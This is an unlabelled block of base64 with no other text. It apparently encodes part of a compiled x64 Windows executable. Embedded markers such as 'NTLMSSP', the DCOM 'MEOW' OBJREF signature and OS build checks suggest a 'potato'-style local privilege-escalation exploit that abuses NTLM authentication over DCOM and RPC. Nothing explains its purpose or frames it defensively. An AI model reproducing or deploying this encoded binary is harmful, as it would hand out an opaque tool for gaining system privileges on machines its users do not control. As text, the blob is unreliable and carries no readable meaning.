QgEAALkCAgAASI2VYEAAAP8Vsq8BAIXAdBiL0EiNDX1OAgDoyPz//0WNfCQB6Q4BAAC6AQAAAL8CAAAAi89EjUIF/xWYrwEATIv4SIP4/3Ul/xWxrwEASI0Nok4CAIvQ6Iv8////FW2vAQBBvwEAAADpygAAADPASI1MJEhIi9NIiUQkSIlEJFBEjUAM6G7OAAAzwEiNTYAPV8CJRZBJi9YPEUWARI1AFOhSzgAASI1MJEjowNgAAEiNTYBmiXwkaIvY/xUHrwEAD7fLiUQkbP8VIq8BAEG4EAAAAEiNVCRoSYvPZolEJGr/FfmuAQCD+P91OP8VDq8BAIvQSI0NTU4CAOjo+///SYvP/xWfrgEAg/j/D4VL/////xXorgEASI0NiU4CAOky////TItEJCBIjQ3YTgIASYvW6BD8//9BvAEAAAAzwDP/hfYPjtMDAABIjVVgD7ZMBFg4CnUpSP/ASIP4B3UiRI13+kWF9n8sTIt0JDCF9g+OpwMAAEiLXCQg6Vj+//8zwEiLXCQg/8dI/8I7/ny+6UP+//9Mi8ZIjVVgSI2NYKAAAOgAegAAi95IjVQ9WkEr3kiNjWCAAABMY8Po53kAAEyLZCQ4TI1EJFhNi8xIjY1ggAAAi9PoLAYAAESLRCRYRTPJSIvQSYvN/xUYrgEAg/j/dQxIjQ28SAIA6RcDAAC56AMAAP8VzKsBAEUzyUiNVWBBuAAgAABJi83/FcatAQCD+P91DEiNDepIAgDp5QIAAEyNTCRAi9BMjYVgQAAASI1NYOhOBwAARTPJSI2VYKAAAESLxkmLz/8VqK0BAIP4/3UMSI0N7EgCAOmnAgAARTPJSI1VYEG4ACAAAEmLz/8VYa0BAESLyIP4/3UMSI0NAkkCAOl9AgAAM9LHRCRYTlRMTWbHRCRcU1PGRCReUESNcv9Fhcl+MjPJTI1FYA8fhAAAAAAAD7ZEDFhBOAB1Dkj/wUiD+Qd1B41y+usPM8n/wkn/wEE70XzcQYv2SGN8JEBIjVVgD7fHSGPeZkErwWaJfWpmA8ZIjY1gYAAAZgFFaEyLw+iMeAAASI2NYGAAAEyLx0gDy0iNlWBAAADoc3gAAEiLXCQoRI0EN0iLy0iNlWBgAABFM8n/FbesAQBBO8Z1DEiNDYtIAgDptgEAAEUzyUiNVWBBuAAgAABIi8v/FXCsAQBEi8hBO8Z1DEiNDbFIAgDpjAEAADPSx0QkWE5UTE1mx0QkXFNTxkQkXlBFhcl+HTPJTI1FYA+2RAxYQTgAdWZI/8FIg/kHdV9EjXL6SA+/XWpIjVVgSWPGSI2NYCAAAEyLw0gD0OjGdwAAi9NMjUQkWE2LzEiNjWAgAADoEAQAAESLRCRYRTPJSIvQSYvN/xX8qwEAg/j/dRpIjQ1gSAIA6fsAAAAzyf/CSf/AQTvRfITrmUhjhYAgAABIjZVgIAAATA+/hXwgAABIjU0gD1fASAPQDxFFIA8RRTDoUHcAAEhjhYggAABIjZVgIAAATA+/hYQgAABIjU3gD1fASAPQDxFF4A8RRfDoI3cAAEhjhZAgAABIjZVgIAAATA+/hYwgAABIjU2gD1fASAPQDxFFoA8RRbDo9nYAAEyNTaBMjUXgSI1VIEiNDeNLAgDofvj//0UzyccFmbcCAAEAAABBuAAgAABIjVVgSYvN/xX+qgEAg/j/dQlIjQ26RwIA6yCAfWk0dROAfWowdQ2AfWs0SI0N2UcCAHQHSI0NEEgCAOgr+P//SItMJCj/FYCqAQBJi8//FXeqAQBJi83/FW6qAQD/FZCqAQBIi41gwAAASDPM6OkdAABIgcR4wQAAQV9BXkFdQVxfXltdw8zMzMzMQFZIgewgAgAASIsFaJcCAEgzxEiJhCQQAgAASIvxSMdEJCAAAAAAuQICAABIjVQkYP8VIaoBAIXAD4VaAQAAM8DHRCQsAgAAAA9XwMdEJDABAAAAD1fJx0QkNAYAAABIi9bHRCQoAQAAAESNQAxIiYQkAAIAAEiNjCQAAgAAiYQkCAIAAPMPf0QkOPMPf0wkSOj6yAAATI1MJCAzyUyNRCQoSI2UJAACAAD/FaCpAQCFwA+F+gAAAEiLRCQgSImcJDgCAABEi0AMi1AIi0gE/xWbqQEASIvYSIP4/w+E7wAAAEiLVCQgSIvIRItCEEiLUiD/FUCpAQCD+P8PhAABAABIi0wkIP8VhKkBAEiL1kiNDVJHAgDoxfb//7r///9/SIvL/xUfqQEAg/j/D4QIAQAARTPASIm8JEACAAAz0kiLy/8V6KgBAEiL+EiD+P8PhBMBAABIi9ZIjQ2BRwIA6Hz2//9Ii8v/FdOoAQBIi5wkOAIAAEiLx0iLvCRAAgAASIuMJBACAABIM8zoQBwAAEiBxCACAABew4vQSI0NNkYCAOg59v//uf/////o430AAMyL0EiNDUVGAgDoIPb///8VoqgBALn/////6MR9AADM/xXBqAEAi9BIjQ1IRgIA6Pv1//9Ii0wkIP8VoKgBAP8VcqgBALn/////6JR9AADM/xWRqAEAi9BIjQ04RgIA6Mv1//9Ii0wkIP8VcKgBAEiLy/8VF6gBAP8VOagBALn/////6Ft9AADM/xVYqAEAi9BIjQ1PRgIA6JL1//9Ii8v/FemnAQD/FQuoAQC5/////+gtfQAAzP8VKqgBAIvQSI0NQUYCAOhk9f//SIvL/xW7pwEA/xXdpwEAuf/////o/3wAAMzMzMzMzMzMzMzMQFNVVldBVrigIAAA6E+YAQBIK+BIiwW9lAIASDPESImEJJAgAAAPEAU7SAIAiwVlSAIASYvZDxANO0gCAImEJIAAAABNi/APtgVOSAIAi/IPEUQkUEiL+YiEJIQAAAAPEAUiSAIADxFMJGAPEUQkcP8VeqQBALoIAAAAQbgAIAAASIvI/xVepAEAD1fASI1MJDhIi+hIi9MzwA8RRCQ4iUQkSESNQBToRMYAAMdEJDAAIAAA/xU2pAEAuggAAABBuAAgAABIi8j/FRqkAQBBuAEAAECL1kiL2EiLz0iNRCQwTIvLSIlEJCD/FemjAQCFwHRoM9JIjYwkkAAAAEG4ACAAAOg4OgAATGNEJDBIjYwkkAAAAEiL0+iDcgAATI2MJJAAAABIi81MjUQkOEiNVCRQ6Gn0//9BiQZIi8VIi4wkkCAAAEgzzOjjGQAASIHEoCAAAEFeX15dW8P/Fe+jAQCL0EiNDXZHAgDo0fP///8Ve6MBAEyLwzPSSIvI/xVdpAEAuf/////oZ3sAAMzMzEiJXCQIVldBVrhgIAAA6L2WAQBIK+BIiwUrkwIASDPESImEJFAgAABNi/FIY/pJi/DHRCRATlRMTUUzwMZEJEQgRTPJTIvZhdJ+LTPJM9KQD7ZEFEBCOAQZdQxB/8BI/8JIg/oFdA1B/8FI/8FIO8983usERY1BATPbRDvHfTVJY9BIjUQkUEgr0EiNTCRQTo0EGkEPtgQIPA11CEGAfAgBCnQQiAH/w0j/wUiNBApIO8d830HHBgAgAAD/FZ+iAQC6CAAAAEG4ACAAAEiLyP8Vg6IBAEjHRCQwAAAAAEiNTCRQTIvISMdEJCgAAAAAQbgBAAAATIl0JCCL00iL+P8VO6IBAIXAdEIz0kG4ACAAAEiLzuiXOAAATWMGSIvXSIvO6OlwAABIi4wkUCAAAEgzzOhpGAAASIucJIAgAABIgcRgIAAAQV5fXsP/FW+iAQCL0EiNDSZGAgDoUfL///8V+6EBAEyLxzPSSIvI/xXdogEAuf/////o53kAAMzMzEyJRCQYTIlMJCBTVVZIg+xASI1C/0mL6EiL8Ug9/v//f3YbuFcAB4BIhdIPhIUAAAAz22aJGUiDxEBeXVvDSIl8JDgz20yJdCQwSI16/0yNdCR46Gjx//9MiXQkKEyLzUyLx0iJXCQgSIvWSIsISIPJAegdvwAATIt0JDCFwLn/////D0jBhcB4HEiYSDvHdxV1HGaJHH6Lw0iLfCQ4SIPEQF5dW8NmiRx+u3oAB4BIi3wkOIvDSIPEQF5dW8PMzDPAw8zMzMzMzMzMzMzMzMxIi0QkOMcAAAQAADPAw8zMSIPsKEiLVCRgSI0NQEUCAP8VKqQBADPASIPEKMPMzMxIiVwkCEiJdCQYSIl8JCBVQVRBVUFWQVdIjawkYP3//0iB7KADAABIiwWakAIASDPESImFkAIAAIsFSkUCAEiNjZAAAADyDxAFM0UCADP/QDg9BrACAEyLDQOwAgCJRCRoD7cFJEUCAGaJRCRsSIlUJFDyDxFEJGB0HUiLBeevAgBMjUQkYLoAAQAASIlEJCDoa/7//+tKuoAAAABIjYWQAAAATCvJZmYPH4QAAAAAAEiNin7//39Ihcl0F0IPtwwIZoXJdA1miQhIg8ACSIPqAXXdSIXSSI1I/kgPRchmiTlBuAABAABIjZWQAAAASI1NkOjpwQAASMfG/////0yNdZBIi95IjUWQDx+AAAAAAEj/w0A4PBh192aDwwPHRCQwTUVPV2YD20jHRCQ0AQAAAEQPt+szyUGDxQhm0etB0e2JfCQ8x0QkQMAAAABIx0QkRAAAAEbHRCRMAQAAAOjNzAAASIvI6EXMAAAPH0QAAOgPzAAARIvAuIGAgIBB9+hBA9DB+geLysHpHwPRacr/AAAARCvBQf7ARIhEPHBI/8dIg/8gfMlIjUWQDx9EAABI/8aAPDAAdfcD9kxj/kmLz+juzAAAM9JMi+CF9n4hM8n2wgF0CUUPtgZJ/8brA0UywESIBAH/wkj/wUk7z3zhiFwkWo1eUkhjy0SIbCRYxkQkWQDGRCRbAOimzAAADxBEJDCLTCRYTYvHDxBMJEBJi9RIi/gPEQAPEEQkcA8RSBAPEE2ADxFAIA8RSDCJSEBIjUhFxkBEB+hDbQAASItMJFBMjUwkXEhjxkSLw0iL18dEOEUAAAAAx0Q4SQAKAP/HRDhN/wAAAMZEOFEASIsBx0QkXAAAAAD/UCCLVCRcSI0N+kICAOiV7v//SIvP6P3LAABJi8zo9csAADPASIuNkAIAAEgzzOhkFAAATI2cJKADAABJi1swSYtzQEmLe0hJi+NBX0FeQV1BXF3DzMzMSccBAAAAADPAw8zMzMzMzEiD7ChIi0kISIsB/1BIM8BIg8Qow8zMzMzMzMzMzMzMSIPsOEiLSQhIi0QkYEiJRCQgTIsRQf9SODPASIPEOMNIg+w4SItEJGhIi0kISIlEJCiLRCRgiUQkIEyLEUH/UigzwEiDxDjDzMzMzMzMzMxIg+w4SItEJGhIi0kISIlEJCiLRCRgiUQkIEyLEUH/UhgzwEiDxDjDzMzMzMzMzMxIg+woSItJCEiLAf9QYDPASIPEKMPMzMzMzMzMzMzMzEiD7DhIi0kISItEJGBIiUQkIEyLEUH/UlgzwEiDxDjDSIPsOEiLSQiLRCRgiUQkIEyLEUH/UkAzwEiDxDjDzMxIg+xISIuEJIAAAABIi0kISIlEJDCLRCR4iUQkKEiLRCRwTIsRSIlEJCBB/1IwM8BIg8RIw8zMzMzMzMzMzMzMSIPsOEiLRCRoSItJCEiJRCQoi0QkYIlEJCBMixFB/1IgM8BIg8Q4w8zMzMzMzMzMSIlcJCBXSIPsQEiLBVeMAgBIM8RIiUQkOEiLSQhIi/pIiwH/kIgAAAAPEAUoQQIAiwUyQQIAuRQAAACJRCQwDxFEJCD/FX6fAQBMjUQkILoUAAAASIvISIvY6AnJAAAzwEiJH0iLTCQ4SDPM6E8SAABIi1wkaEiDxEBfw8zMzMxNhcB1BrhXAAeAw0iLAkg7BSugAQB1DUiLQghIOwUmoAEAdDJIiwJIOwUCoAEAdQ1Ii0IISDsF/Z8BAHQZSIsCSDsF2Z8BAHUTSItCCEg7BdSfAQB1BkmJCDPAw0nHAAAAAAC4AkAAgMPMzMzMzMzMi0EY/8CJQRjDzMzMzMzMzItBGI1Q/4lRGMPMzEiD6Qjp6////8zMzEiD6Qjpz////8zMzEiD6QjpU////8zMzEBTSIPsIEiL2UiLwkiNDdWfAQAPV8BIjVMISIkLSI1ICA8RAuhrLQAASIvDSIPEIFvDzMzMzMzMzMzMzMzMzMxIi1EISI0F3UACAEiF0kgPRcLDzMzMzMzMzMzMzMzMzEiJXCQIV0iD7CBIjQV3nwEASIv5SIkBi9pIg8EI6KItAAD2wwF0DboYAAAASIvP6AQTAABIi1wkMEiLx0iDxCBfw8zMzMzMzMzMzMzMzMzMSI0FMZ8BAEiJAUiDwQjpYS0AAMzMzMzMzMzMzMzMzMxIjQVpQAIASMdBEAAAAABIiUEISI0FPp8BAEiJAUiLwcPMzMzMzMzMzMzMzMzMzMxIg+xISI1MJCDowv///0iNFfN0AgBIjUwkIOg5LwAAzEBTSIPsIEiL2UiLwkiNDbWeAQAPV8BIjVMISIkLSI1ICA8RAuhLLAAASI0F2J4BAEiJA0iLw0iDxCBbw8zMzMxAU0iD7CBIi9lIi8JIjQ11ngEAD1fASI1TCEiJC0iNSAgPEQLoCywAAEiNBXCeAQBIiQNIi8NIg8QgW8PMzMzMSIPsKEiNDa0/AgDoxB0AAMzMzMzMzMzMzMzMzMzMzMxEiQJIi8JIiUoIw8zMzMzMQFNIg+wwSIsBSYvYRIvCSI1UJCD/UBhIi0sITItICEiLUQhJOVEIdQ6LCzkIdQiwAUiDxDBbwzLASIPEMFvDzEiLQghMi0gITDlJCHUIRDkCdQOwAcMywMPMzMzMzMzMSIsJ6SgcAADMzMzMzMzMzEiNBSE/AgDDzMzMzMzMzMxAU0iD7DBBi8hIiVQkIEiL2ugCHAAASMdDEAAAAABJx8D/////SMdDGA8AAADGAwBJ/8BCgDwAAHX2SIvQSIvL6FsKAABIi8NIg8QwW8PMzEBTSIPsIEiL2fbCAXQKuhAAAADo4BAAAEiLw0iDxCBbw8zMzMzMzMzMzMzMzMzMzEiNBZk+AgDDzMzMzMzMzMxAU0iD7EBIiwVLiAIASDPESIlEJDBIi9pIiVQkIEjHRCQgAAAAAEiNVCQgQYvI6O0aAABIiUQkKEjHQxAAAAAASMdDGA8AAABIi8vGAwBIhcB1DUSNQA1IjRVCRAIA6whMi8BIi1QkIOijCQAAkEiLTCQg6AgbAABIi8NIi0wkMEgzzOgoDgAASIPEQFvDzMxIiVwkCFdIg+wgQYv4SIvaQYvI6AgbAACFwHUbiTtIjQXbkQIASIlDCEiLw0iLXCQwSIPEIF/DiQNIjQXQkQIASIlDCEiLw0iLXCQwSIPEIF/DzMzMzMzMzMzMzMzMzMxIiVwkCEiJdCQYSIl8JCBVQVRBVUFWQVdIjawkkP7//0iB7HACAABIiwU6hwIASDPESImFYAEAAIsFaj0CAEyNrdgAAAAPEAVkPQIATI2l4AAAAImF2AAAAA8oDZA9AgBMjb0QAQAAD7cFPj0CALsBAAAAZomF3AAAADP2iwU+PQIASIv6iYUAAQAARIvxD7cFOz0CAGaJhegAAACLBYY9AgCJhVgBAAAPtwV9PQIAZomFXAEAAEiNhfAAAAAPKY0gAQAADygNRT0CAEiJBS6mAgAPKY1AAQAADxGF8AAAAPIPEAXgPAIA8g8RheAAAAAPKAXpPAIADymFEAEAAA8oBfs8AgAPKYUwAQAA8g8QBQw9AgDyDxGFUAEAADvLD463AAAATI0FNdb//w8fRAAASGPDSIsUx2aDOi0PhZoAAAAPt0ICg8Cdg/gQD4dZAwAASJhBi4yAaC0AAEkDyP/h/8NIY8tIiwzP6F7CAACJBUyQAgBMjQXl1f//607/w0hjw0yLPMfrQ//DSGPDTIskx+s4/8NIY8NMiyzH6y3/w0hjw0iLDMdIiQ1apQIA6xv/w0hjw0iLDMdIiQ1ApQIA6wn/w0hjw0iLNMf/w0GDxv5Bg/4BD49V////SIM9JaUCAAAPhKQCAABIhfYPhJsCAAAz0kiNTaRBuBgBAADozSsAAEiNDQZAAgDHRaAcAQAA/xWJlQEASIvISI0V3z8CAP8VcZUBAEiNTaD/0IN9pAp3GYF9rO5CAAB3EEiNDQ08AgDoiOX//7AB6zJMiwW1pAIASI0NdjwCAEiL1kiJNZykAgDoZ+X//0iLFZikAgBIjQ0ZPQIA6FTl//8ywEiL1ogFdaQCAEiNDWo9AgBMiSV7pAIA6Dbl//9Miw1npAIATI0FaAIAAEUz9jPSTIl0JCgzyUSJdCQg/xXRlAEASI2F8AAAAEyJdCQoSIlEJGhMjUwkWEiLBSykAgBMjQWNAwAAM9JIiUQkeDPJSIl0JFhMiWwkYEyJZCRwRIl0JCD/FYqUAQCDPbOOAgD/SIv4D4X+AAAAM8n/FZqXAQBMjUQkSEyJdCRQQY1WAUyJdCRIM8n/FZ+XAQBIi0wkSEyNTCRQRTPAuhIQAAD/FU+XAQBBjU4g6DIMAAAPV8BIiUQkQEiNFac5AgAPEQBIjVgIDxFAEEiLTCRQSIkQSI0V9TgCAEiJE0iNVZBIiUgQSYvPx0AYAQAAAP8VIpcBAEiNVYBIjQ2XPAIA/xURlwEASI1FgEyJtcgAAABJi9dIiYXAAAAASI0NxTwCAESJtdAAAADo+eP//0iNhcAAAABFM8BIiUQkMEWNTgTHRCQoAQAAAEiNVZAzyUiJXCQg/xWtlgEARDk17qICAHRQ/xW+lgEA6whJi8/ohAIAALr/////SIvP/xVekwEAM8BIi41gAQAASDPM6IUJAABMjZwkcAIAAEmLWzBJi3NASYt7SEmL40FfQV5BXUFcXcM9BAAIgHURSYvXSI0NWzwCAOhe4///6w6L0EiNDYM8AgDoTuP//7n/////6PhqAADM6E4EAAC5/////+joagAAzOg+BAAAM8no22oAAMxIjQ1/OQIA6Brj///oJQQAALn/////6L9qAADMZpAdKgAASi0AAEotAABKLQAASi0AAD0tAABKLQAASi0AAFAqAAAoKgAAMyoAAEotAABKLQAAPioAAEotAABiKgAAACoAAMzMzMxIg+xoSIsFTYICAEgzxEiJRCRYTIvJSMdEJCAFAAAASI1MJEhBuAUAAABIjVQkUOhEtAAARTPJSMdEJEAAAAAATI1EJFBIjQ2cPgIAQY1RFP8VepQBAIXAdAxIjQ2XPgIA6dcAAABIjQXj8P//QbkQAAAASIlEJDBIjQ1BSQIAx0QkKP////9FM8Az0sdEJCDSBAAA/xVOlAEAhcB0DEiNDYs+AgDpkwAAAEiNTCRA/xUTlAEAhcB0CUiNDag+AgDre0UzyUiNDdM+AgBFM8BBjVEK/xUXlAEAhcB0CUiNDbw+AgDrV0iLVCRATI0N7j4CAEUzwEiNDcRIAgD/Fd6TAQCFwHQJSI0N4z4CAOsuSI1UJFBIjQ0FPwIA6KDh//9FM8C60gQAAEGNSAH/FcaTAQCFwHQOSI0NKz8CAIvQ6Hzh//8zwEiLTCRYSDPM6F0HAABIg8Row8zMzMzMzMzMSIPsOEiLQRhMi0kgTItBEEiLUQhIiwlIiUQkIOj/4f//M8BIg8Q4w8zMzMzMzMzMSIlcJBBIiXQkGEiJfCQgVUiNbCSpSIHs4AAAAEiLBaWAAgBIM8RIiUVHSIv5M8n/FeOTAQAz9kyNRb8zyUiJdcdIiXW/jVYB/xXqkwEASItNv0yNTcdFM8C6EhAAAP8VnJMBAI1OIOiACAAAD1fASIlFt0iNFfY1AgAPEQBIjVgIDxFAEEiLTcdIiRBIjRVFNQIASIkTSI1V/0iJSBBIi8/HQBgBAAAA/xVykwEASI1V30iNDec4AgD/FWGTAQBIjVXvSI0N1jkCAP8VUJMBAEiNRd9IiXU3SIlFL0yNDU2UAQBIjUXXiXU/M9JIiUQkIESNRgFIjU3v/xUJkwEASItN10yNRc9IiXXPSI0VLpQBAEiLAf8QSItNz0SNTgGLFfuJAgBFM8BIiwH/UBiLFeyJAgBIjQ21OQIA6PDf//9Ii9dIjQ3WOQIA6OHf//9Ii03XSI1VL0iJVCQ4TI1F/8dEJDABAAAARTPJSIlcJCgz0kiLAcdEJCAEAAAA/1Awi9hIjVUPRIvATIsNcIkCAEiNDWmJAgBB/1EQOTW3ngIAdGj/FYeSAQBIi1UnSIP6EHItSItND0j/wkiLwUiB+gAQAAByFUiLSfhIg8InSCvBSIPA+EiD+B93KuhIBwAASItNR0gzzOg0BQAATI2cJOAAAABJi1sYSYtzIEmLeyhJi+Ndw+jmvgAAzIH7BAAIgHURSIvXSI0NCzgCAOgO3///6w6L00iNDTM4AgDo/t7//7n/////6KhmAADMzMzMSIPsKEiNDT05AgDo4N7//0iNDWk5AgDo1N7//0iNDaE5AgDoyN7//0iNDaE5AgBIg8Qo6bje///MzMzMzMzMzEBTVVdBVkFXSIPsIEiLaRhNi/BMi/pIi9lMO8V3LEiL+UiD/RByA0iLOUyJcRBIi8/o2lwAAEiLw0HGBD4ASIPEIEFfQV5fXVvDSL//////////f0w79w+H+QAAAEmLzkiDyQ9IO893H0iL1UiLx0jR6kgrwkg76HcOSI0EKkiL+Ug7yEgPQvhIi89IiXQkaEiDwQFIx8D/////SA9CyEiB+QAQAAByLEiNQSdIO8EPhpUAAABIi8jorwUAAEiFwA+EigAAAEiNcCdIg+bgSIlG+OsRSIXJdArojgUAAEiL8OsCM/ZNi8ZMiXMQSYvXSIl7GEiLzugVXAAAQcYENgBIg/0Qci1IiwtIjVUBSIH6ABAAAHIYTItB+EiDwidJK8hIjUH4SIP4H3clSYvI6HUFAABIiTNIi8NIi3QkaEiDxCBBX0FeX11bw+jB8v//zOgbvQAAzOhV8///zMzMzMxMiUQkGEyJTCQgU1VWV0iD7DhJi/BIjWwkeEiL+kiL2ei73P//SIlsJChMi85Mi8dIx0QkIAAAAABIi9NIiwjoDKoAAIXAuf////8PSMFIg8Q4X15dW8PMzMzMzMzMzMxIg+woSI0NxToCAOjg3P//M8BIg8Qow8zMzMzMzMzMzEiD7ChIjQ3FOgIA6MDc//8zwEiDxCjDzMzMzMzMzMzMSIPsKEiNDcU6AgDooNz//zPASIPEKMPMzMzMzMzMzMxIg+woSI0NxToCAOiA3P//M8BIg8Qow8zMzMzMzMzMzEiJXCQISIlsJBBIiXQkGFdBVkFXSIHscAEAAEiLBeZ7AgBIM8RIiYQkYAEAAEyLDXybAgBIjVQkQEiLtCSwAQAASI1MJDhIi7wkuAEAADPASIucJMABAABMi7QkyAEAAEiJRCRARI1ACWaJRCRISMdEJCAJAAAA6KytAABIjQ1NOgIA6Ojb//9Ii9fHAwIAAABIjQ1YOgIA/xXCjgEATI1MJEC6BAEAAEyNBZE6AgBIjUwkUOhn/v//SMfC/////0iNRCRQSIv6Dx+EAAAAAACAfDgBAEiNfwF19cdEJDAFAAcAjV8Hi0QkMI1vA0GJBkG/BwAAAExj88ZEJDQAS40MNkiDwQZID0LK6OW4AABIiQZmiRhIiwZmiWgCSIsGZkSJeASNRwJMY8hJg/kBfiq6AQAAAEG4BgAAAA8fRAAAD75MFE9NjUACSIsGSP/CZkGJTAD+STvRfOZIiwZNjVb/SGPNRTPbugoAAABBuP//AABmRIlcSAJIiwZmiVRIBI1VAUiLBkhjymZEiURIBI1CAUiYSTvCfTFMjUwkNEwryEyNBEUEAAAADx+AAAAAAEEPvhQBTY1AAkiLDkj/wGZBiVQI/kk7wnzmSIsGZkaJXHAESIsGZkaJXFAEM8BIi4wkYAEAAEgzzOhyAAAATI2cJHABAABJi1sgSYtrKEmLczBJi+NBX0FeX8PMzMzMzEiD7ChIjQ01OQIA6FDa//8zwEiDxCjDzMzMzMzMzMzM6b+3AADMzMzMzMzMzMzMzOmbtwAAzMzMzMzMzMzMzMzMzMzMzMxmZg8fhAAAAAAASDsNoXkCAPJ1EkjBwRBm98H///J1AvLDSMHJEOk3AAAAzMzMQFNIg+wgSIvZM8n/FbuKAQBIi8v/FaqKAQD/FbSKAQBIi8i6CQQAwEiDxCBbSP8lqIoBAEiJTCQISIPsOLkXAAAA/xWcigEAhcB0B7kCAAAAzSlIjQ1yhgIA6KkAAABIi0QkOEiJBVmHAgBIjUQkOEiDwAhIiQXphgIASIsFQocCAEiJBbOFAgBIi0QkQEiJBbeGAgDHBY2FAgAJBADAxwWHhQIAAQAAAMcFkYUCAAEAAAC4CAAAAEhrwABIjQ2JhQIASMcEAQIAAAC4CAAAAEhrwABIiw2peAIASIlMBCC4CAAAAEhrwAFIiw2MeAIASIlMBCBIjQ0QjQEA6P/+//9Ig8Q4w8zMQFNWV0iD7EBIi9n/FZOJAQBIi7P4AAAAM/9FM8BIjVQkYEiLzv8VgYkBAEiFwHQ5SINkJDgASI1MJGhIi1QkYEyLyEiJTCQwTIvGSI1MJHBIiUwkKDPJSIlcJCD/FVKJAQD/x4P/AnyxSIPEQF9eW8PMzMxAU0iD7CBIjQWbjAEASIvZSIkB9sIBdAq6GAAAAOhGAAAASIvDSIPEIFvDzEBTSIPsIEiL2esPSIvL6HG4AACFwHQTSIvL6Km1AABIhcB050iDxCBbw0iD+/90BuijAgAAzOhp7f//zOnT/f//zMzMQFNIg+wguQEAAADoILoAAOijBQAAi8joPMIAAOhv5v//i9jo9MMAALkBAAAAiRjoCAMAAITAdHPo9wcAAEiNDSwIAADoowQAAOhiBQAAi8joY7wAAIXAdVLoYgUAAOiZBQAAhcB0DEiNDSLm///oHboAAOhcBQAA6FcFAADoDub//4vI6PPCAADoQgUAAITAdAXoFcEAAOj05f//6MsGAACFwHUGSIPEIFvDuQcAAADoawUAAMzMzEiD7CjoHwUAADPASIPEKMNIg+wo6PcGAADouuX//4vISIPEKOkPwwAAzMzMSIlcJAhIiXQkEFdIg+wwuQEAAADo8wEAAITAD4Q2AQAAQDL2QIh0JCDoogEAAIrYiw2WiAIAg/kBD4QjAQAAhcl1SscFf4gCAAEAAABIjRVYigEASI0NGYoBAOjUwAAAhcB0Crj/AAAA6dkAAABIjRX3iQEASI0N4IkBAOhPwAAAxwVBiAIAAgAAAOsIQLYBQIh0JCCKy+jgAgAA6IMEAABIi9hIgzgAdB5Ii8joMgIAAITAdBJFM8BBjVACM8lIiwP/FXyJAQDoXwQAAEiL2EiDOAB0FEiLyOgGAgAAhMB0CEiLC+iqXQAA6Im/AABIi/jo7cAAAEiLGOjdwAAATIvHSIvTiwjoQO7//4vY6H0FAACEwHRVQIT2dQXoV10AADPSsQHodgIAAIvD6xmL2OhbBQAAhMB0O4B8JCAAdQXoI10AAIvDSItcJEBIi3QkSEiDxDBfw7kHAAAA6NsDAACQuQcAAADo0AMAAIvL6F1dAACQi8voDV0AAJBIg+wo6JsCAABIg8Qo6XL+///MzEiDYRAASI0F8IkBAEiJQQhIjQXViQEASIkBSIvBw8zMSIPsSEiNTCQg6NL///9IjRX/XQIASI1MJCDoBRoAAMxIg+wo6JMHAACFwHQhZUiLBCUwAAAASItICOsFSDvIdBQzwPBID7EN2IYCAHXuMsBIg8Qow7AB6/fMzMxAU0iD7CAPtgXDhgIAhcm7AQAAAA9Ew4gFs4YCAOiaBQAA6EEaAACEwHUEMsDrFOgoxgAAhMB1CTPJ6FEaAADr6orDSIPEIFvDzMzMQFNIg+wggD14hgIAAIvZdWeD+QF3auj5BgAAhcB0KIXbdSRIjQ1ihgIA6EXEAACFwHUQSI0NaoYCAOg1xAAAhcB0LjLA6zNmD28FFYkBAEiDyP/zD38FMYYCAEiJBTqGAgDzD38FOoYCAEiJBUOGAgDGBQ2GAgABsAFIg8QgW8O5BQAAAOhaAgAAzMxIg+wYTIvBuE1aAABmOQW1w///dXhIYw3ow///SI0VpcP//0gDyoE5UEUAAHVfuAsCAABmOUEYdVRMK8IPt0EUSI1RGEgD0A+3QQZIjQyATI0MykiJFCRJO9F0GItKDEw7wXIKi0IIA8FMO8ByCEiDwijr3zPSSIXSdQQywOsUg3okAH0EMsDrCrAB6wYywOsCMsBIg8QYw0BTSIPsIIrZ6OMFAAAz0oXAdAuE23UHSIcVOoUCAEiDxCBbw0BTSIPsIIA9L4UCAACK2XQEhNJ1DOjCxAAAisvo2xgAALABSIPEIFvDzMzMQFNIg+wgSIM9CoUCAP9Ii9l1B+icwgAA6w9Ii9NIjQ30hAIA6P/CAAAz0oXASA9E00iLwkiDxCBbw8zMSIPsKOi7////SPfYG8D32P/ISIPEKMPMSIlcJCBVSIvsSIPsIEiLBYByAgBIuzKi3y2ZKwAASDvDdXRIg2UYAEiNTRj/FeKDAQBIi0UYSIlFEP8VzIMBAIvASDFFEP8VuIMBAIvASI1NIEgxRRD/FaCDAQCLRSBIjU0QSMHgIEgzRSBIM0UQSDPBSLn///////8AAEgjwUi5M6LfLZkrAABIO8NID0TBSIkF/XECAEiLXCRISPfQSIkF5nECAEiDxCBdw7gBAAAAw8zMuABAAADDzMxIjQ05hAIASP8lUoMBAMzMsAHDzMIAAMxIjQUxhAIAw0iD7Cjop9H//0iDCCTo5v///0iDCAJIg8Qow8wzwDkFoHECAA+UwMNIjQVJkQIAw0iNBTmRAgDDgyX5gwIAAMNIiVwkCFVIjawkQPv//0iB7MAFAACL2bkXAAAA/xW2ggEAhcB0BIvLzSm5AwAAAOjE////M9JIjU3wQbjQBAAA6JsXAABIjU3w/xVRggEASIud6AAAAEiNldgEAABIi8tFM8D/FT+CAQBIhcB0PEiDZCQ4AEiNjeAEAABIi5XYBAAATIvISIlMJDBMi8NIjY3oBAAASIlMJChIjU3wSIlMJCAzyf8VBoIBAEiLhcgEAABIjUwkUEiJhegAAAAz0kiNhcgEAABBuJgAAABIg8AISImFiAAAAOgEFwAASIuFyAQAAEiJRCRgx0QkUBUAAEDHRCRUAQAAAP8VCoIBAIP4AUiNRCRQSIlEJEBIjUXwD5TDSIlEJEgzyf8VoYEBAEiNTCRA/xWOgQEAhcB1DITbdQiNSAPovv7//0iLnCTQBQAASIHEwAUAAF3DzOkf3///zMzMSIPsKDPJ/xVQgAEASIXAdDq5TVoAAGY5CHUwSGNIPEgDyIE5UEUAAHUhuAsCAABmOUEYdRaDuYQAAAAOdg2DufgAAAAAdASwAesCMsBIg8Qow8zMSI0NCQAAAEj/JQqBAQDMzEiJXCQIV0iD7CBIixlIi/mBO2NzbeB1HIN7GAR1FotTII2C4Pps5oP4AnYVgfoAQJkBdA1Ii1wkMDPASIPEIF/D6K4RAABIiRhIi18I6LYRAABIiRjoZsEAAMzMSIlcJAhXSIPsIEiNHVtDAgBIjT1UQwIA6xJIiwNIhcB0Bv8VzIIBAEiDwwhIO99y6UiLXCQwSIPEIF/DSIlcJAhXSIPsIEiNHS9DAgBIjT0oQwIA6xJIiwNIhcB0Bv8VkIIBAEiDwwhIO99y6UiLXCQwSIPEIF/DSIlcJBBIiXQkGFdIg+wQM8AzyQ+iRIvBRTPbRIvLQYHwb